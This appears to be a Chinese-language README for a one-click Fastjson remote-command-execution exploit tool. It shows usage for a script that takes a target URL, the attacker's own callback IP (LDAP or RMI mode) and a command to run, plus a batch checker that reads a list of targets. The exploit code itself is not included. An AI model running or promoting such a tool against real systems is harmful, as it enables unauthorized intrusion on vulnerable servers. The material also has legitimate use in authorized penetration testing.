# fastjson_rec_exploit
fastjson一键命令执行

脚本使用：

usage: Fastjson one-key command is executed! [-h] [-u URL] [-s SELF] [-c COMMAMD]

python3 fastjson.py -u [Target Url] -s [self IP] -c [command]

optional arguments:

  -h, --help            show this help message and exit
  
  -u URL, --url URL     漏洞url
  
  -s SELF, --self SELF  自己IP，如果是VPS请输入公网IP
  
  -c COMMAMD, --commamd COMMAMD 执行的命令,有空格请加上双引号

  -m [MODE], --mode [MODE]  选择执行模式(可选)，1：ldap模式(默认)；2：rmi模式

python3 fastjson.py -u http://192.168.1.3/ -s 192.168.1.1 -c "touch /tmp/test.txt

使用截图：

![image](https://github.com/mrknow001/fastjson_rec_exploit/blob/master/img/%E6%94%BB%E5%87%BB%E6%88%AA%E5%9B%BE.png)

![image](https://github.com/mrknow001/fastjson_rec_exploit/blob/master/img/%E9%9D%B6%E6%9C%BA%E6%88%AA%E5%9B%BE.png)


批量检测链接放target.txt中。
usage:python3 fastjson_check.py

![image](https://github.com/mrknow001/fastjson_rec_exploit/blob/master/img/1.png)
